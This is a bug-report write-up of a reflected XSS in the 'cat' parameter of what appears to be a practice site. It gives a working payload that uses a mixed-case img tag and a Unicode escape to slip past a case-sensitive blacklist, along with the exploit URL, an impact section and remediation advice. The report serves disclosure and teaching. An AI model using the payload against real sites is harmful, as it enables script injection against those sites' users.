## Title
Reflected XSS - String Concatenation Bypass
<!-- Write a short, clear title describing the vulnerability and where it was found. Example: Stored XSS in User Profile -->

## Description
**Affected URL:** https://portal.pwnedbox.site/
<!-- Explain what the vulnerability is, where it exists, and why it is a security issue. Include the affected URL or endpoint. -->
A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `cat` GET parameter. The application uses case-sensitive blacklist substitutions and then outputs the parameter without HTML encoding. The mixed-case `<imG>` tag bypasses the lowercase `img` filter. Its invalid `src` triggers the `onerror` handler, where the JavaScript Unicode escape `\u0061` is interpreted as `a`, executing `alert(1)`.
## Steps to Reproduce
<!-- Provide clear, numbered steps so another person can reproduce the issue. Include required requests, parameters, and actions. -->
1. Enumerate the GET parameters and identify `cat`:

   ```bash
   echo "https://portal.pwnedbox.site/" | x8scan
   ```

2. Use this exact payload in the `cat` parameter:

   ```text
   <imG src=x onerror=\u0061lert(1)>
   ```

   Open the URL:

   ```text
   https://portal.pwnedbox.site/?cat=<imG%20src=x%20onerror=\u0061lert(1)>
   ```

3. Observe the `alert(1)` popup.
## POC (Proof of Concept)
<!-- Add screenshots, HTTP requests/responses, payloads, or videos that demonstrate the vulnerability. -->
1. `x8scan` output identifying `cat` among the GET parameters.  

<img width="1920" height="1020" alt="1" src="https://github.com/user-attachments/assets/b2ab65cd-3040-4f6a-80ba-24baea61426f" />

2. Source code showing the case-sensitive filter and direct output of `cat`.  

<img width="1920" height="969" alt="2" src="https://github.com/user-attachments/assets/5b4a20f7-ce05-4a7a-b31b-5a12d0e717d2" />

3. The exact `<imG>` payload triggers the `alert(1)` popup.

<img width="1920" height="971" alt="3" src="https://github.com/user-attachments/assets/c04b0311-a476-486e-a676-dffe1e6e41bc" />

## Impact
<!-- Explain what an attacker could achieve, who could be affected, and the realistic security consequences. -->
A crafted link could execute JavaScript under the `portal.pwnedbox.site` origin. Depending on the page’s functionality and accessible data, this could allow page manipulation or access to data available to page scripts.
## Remediation
<!-- Suggest specific steps to fix the vulnerability. Include secure coding practices or configuration changes where appropriate. -->
1. HTML-encode `cat` before reflecting it in the response. In PHP, use `htmlspecialchars($cat, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')`.

2. Remove the blacklist-based filtering; if `cat` has expected values, validate it against an allowlist.
